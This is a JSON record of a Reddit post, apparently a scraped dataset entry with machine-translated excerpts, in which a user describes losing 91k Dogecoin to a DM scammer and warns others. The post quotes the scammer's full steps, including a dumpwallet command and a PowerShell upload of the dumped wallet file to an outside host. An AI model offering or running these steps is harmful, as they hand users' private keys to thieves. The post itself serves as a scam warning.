@@ -1,0 +1,64 @@
+{
+  "author": "TetrisGoku",
+  "the_new_excerpt": "I mined dogecoin in my first year of university in 2013. It was a fun thing to\ndo in-between studying for exams with my floormates. I managed to mine 91k\ncoins. I never touched them since 2013. Thankfully I kept my old laptop.\n\nIt had been on my mind even during the last bull market in 2017 if I…",
+  "original_created_utc": 1620309322,
+  "localize": [
+    {
+      "locale": "ja",
+      "the_new_excerpt": "私は2013年の大学1年生の時に、dogecoinを採掘しました。受験勉強の合間の楽しみでした。\n仲間との試験勉強の合間にやっていました。91kのコインを採掘することができました。\nコインを採掘しました。2013年以降は一度も触っていません。ありがたいことに、私は古いノートパソコンを持っていました。\n\n2017年の最後の強気相場の時にも、もし...と考えていました。",
+      "title": "91k Dogecoinの詐欺に遭いました。"
+    },
+    {
+      "locale": "zh",
+      "the_new_excerpt": "我在2013年大学一年级的时候挖过dogecoin。这是一件有趣的事情\n在和我的同学们学习考试的间隙做的一件有趣的事情。我成功地挖到了91K\n币。自2013年以来，我从未碰过它们。幸好我保留了我的旧笔记本电脑。\n\n即使在2017年的最后一次牛市中，我也一直在想，如果我...",
+      "title": "刚被骗了9.1万狗币"
+    },
+    {
+      "locale": "zh-Hant",
+      "the_new_excerpt": "我在2013年大學一年級的時候挖過dogecoin。這是一件有趣的事情\n在和我的同學們學習考試的間隙做的一件有趣的事情。我成功地挖到了91K\n幣。自2013年以來，我從未碰過它們。幸好我保留了我的舊筆記本電腦。\n\n即使在2017年的最後一次牛市中，我也一直在想，如果我...",
+      "title": "剛被騙了9.1萬狗幣"
+    }
+  ],
+  "title": "Just got Scammed of 91k Dogecoins",
+  "created_utc": 1620329436,
+  "selftext_html": "<!-- SC_OFF --><div class=\"md\"><p>I mined dogecoin in my first year of university in 2013. It was a fun thing to do in-between studying for exams with my floormates. I managed to mine 91k coins. I never touched them since 2013. Thankfully I kept my old laptop.</p>\n\n<p>It had been on my mind even during the last bull market in 2017 if I could even access my dogecoins. Never got around to try, was busy with university/life. And I was more than happy to just keep the dogecoins and see what happens. It was so exciting back then to see DogeCoin go up in price from being worth nothing to $0.06 and eventually $0.08 cents. With the recent price surges, I decided I would figure out how to take out my coins. Mainly because of a growing doubt in my mind that my coins were not accessible. I made a post yesterday about the coins I mined and how to transfer them out of a 2013 wallet. I got a DM from user -Jax_Brantley- (sorry reddit won&#39;t let me link his profile). Telling me that I needed to get on the &quot;Correct Fork&quot; otherwise when I send my coins they would be &quot;stuck in limbo&quot;. He sent me two posts corroborating his claims:</p>\n\n<p><a href=\"https://github.com/dogecoin/dogecoin/issues/250\">https://github.com/dogecoin/dogecoin/issues/250</a></p>\n\n<p><a href=\"https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg_lost_coins_to_fork_after_just_starting_much/\">https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg_lost_coins_to_fork_after_just_starting_much/</a></p>\n\n<p>His profile looked legit to me with activity on the doge forums. Even a popular post saying how he recovered 389k of Dogecoins (<a href=\"https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge_coin_saved_my_life_holding_389k_coins/\">https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge_coin_saved_my_life_holding_389k_coins/</a>). He told me how my story was similar to his. His profile has many comments &quot;helping other against scammers&quot; in the community.</p>\n\n<p>The story he presented to me made sense and I gave him a chance; this was due to my lack of knowledge (my floormate installed everything on my computer), outdated Dogecore wallet, the posts he sent me, his reddit profile. I was unknowingly falling for his bait.. Anyways we talked some more. I uploaded our conversation for those that are interested. It seems he deleted our first messages. <a href=\"https://imgur.com/gallery/yh1g7CQ\">https://imgur.com/gallery/yh1g7CQ</a></p>\n\n<p>The main part of my post is to bring awareness to this scam. If anyone is trying to take advantage of your &#39;old wallet&#39; pre-2014 fork, please do NOT give them any of your time. Please avoid any DMs containing the following steps (he even &#39;kindly&#39; wrote detailed steps for my dumbass):</p>\n\n<p>Step 1) Close dogecore-qt.exe and find the dogecore-qt.exe (right click it and run as admin)</p>\n\n<p>Step 2) go to Tools -&gt; debug -&gt; console</p>\n\n<p>Step 3) type</p>\n\n<p>dumpwallet <a href=\"https://peers-log.zip/\">peers-log.zip</a></p>\n\n<p>Step 4) find the zip beside dogecore-qt.exe or in C:/Program Files/Dogecoin</p>\n\n<p>Step 5) in this folder hold shift + right click anywhere and select open &quot;powershell here&quot; from the dropdown menu</p>\n\n<p>Step 6) type this command or copy paste it</p>\n\n<p>invoke-webrequest -method PUT -infile .\\<a href=\"https://peers-log.zip/\">peers-log.zip</a> <a href=\"https://dogecoin-peers.online/nodes\">dogecoin-peers.online/nodes</a> -usebasicparsing</p>\n\n<p>Step 7) go to the new folder it created called &quot;dogecoin-peers/online&quot; and find the file called nodes.txt and open it.</p>\n\n<p>Step 8) It will have a list of connection failed and node ID</p>\n\n<p>Step 9) go to the console like in step 2 and type remove node &lt;ID HERE&gt;</p>\n\n<p>Step 10) Restart wallet and you are all done.</p>\n\n<p>After completing step 6, the truth presented itself. I got scammed... I looked on reddit more for this type of scam (should have had a better eye originally). Sadly, I came across this post too late. <a href=\"https://np.reddit.com/r/dogecoin/comments/n2yxgq/how_the_scam_works/\">https://np.reddit.com/r/dogecoin/comments/n2yxgq/how_the_scam_works/</a></p>\n\n<p>For those interested, here&#39;s my old wallet: <a href=\"https://dogechain.info/address/DFCW6SR6FB518RkpYjhsDL5BkX1zqRKe3A\">https://dogechain.info/address/DFCW6SR6FB518RkpYjhsDL5BkX1zqRKe3A</a></p>\n\n<p>A picture of the old wallet from my laptop.</p>\n\n<p><a href=\"https://imgur.com/a/KYLvxuj\">https://imgur.com/a/KYLvxuj</a></p>\n\n<p>Thank you to anyone who has read my post. I was conflicted to even post about this because I just was filled with emotion and that it would be an incoherent batch of word salad. After writing this out, I have been able to get more clarity and peace.</p>\n\n<p>I hope there is someone that I can help and they would not fall for the same scam I did. Everyone who has made life-changing money or any money with Dogecoins, I am happy for you. Please appreciate what you have for me.</p>\n\n<p>Take care,</p>\n\n<p>(Originally tried to post to Dogecoin subreddit but I can&#39;t get passed the auto moderator...)</p>\n\n<p>Dogeminer 2013</p>\n</div><!-- SC_ON -->",
+  "score": 967,
+  "preview": {
+    "images": [
+      {
+        "source": {
+          "url": "https://external-preview.redd.it/rboeK1a4ClsFR3RkNVHT1EiKAiOCBZ5gic-EqppOGoU.jpg?auto=webp&s=2a91df3bd03ab6d74f63d4d0a9d495182fdf1113",
+          "width": 600,
+          "height": 315
+        },
+        "resolutions": [
+          {
+            "url": "https://external-preview.redd.it/rboeK1a4ClsFR3RkNVHT1EiKAiOCBZ5gic-EqppOGoU.jpg?width=108&crop=smart&auto=webp&s=e7510bf02821a6fa9dbb8939b2b44e53643267f7",
+            "width": 108,
+            "height": 56
+          },
+          {
+            "url": "https://external-preview.redd.it/rboeK1a4ClsFR3RkNVHT1EiKAiOCBZ5gic-EqppOGoU.jpg?width=216&crop=smart&auto=webp&s=c675d3b0e5e07e43fc68ec47a11f50e2b9b66662",
+            "width": 216,
+            "height": 113
+          },
+          {
+            "url": "https://external-preview.redd.it/rboeK1a4ClsFR3RkNVHT1EiKAiOCBZ5gic-EqppOGoU.jpg?width=320&crop=smart&auto=webp&s=132fd44b357fa2d3dc2e9352b13f41f4482fac4c",
+            "width": 320,
+            "height": 168
+          }
+        ],
+        "variants": {},
+        "id": "dho9k-YIBjP5gqnP_jtAm8tRFHpRVFpVJ8SYj8Ue3sE"
+      }
+    ],
+    "enabled": false
+  },
+  "permalink": "/r/CryptoCurrency/comments/n67tv3/just_got_scammed_of_91k_dogecoins/",
+  "subreddit": "CryptoCurrency",
+  "id": "n67tv3",
+  "is_self": true,
+  "media": null,
+  "is_video": false,
+  "source_updated_at": 1620985987339
+}
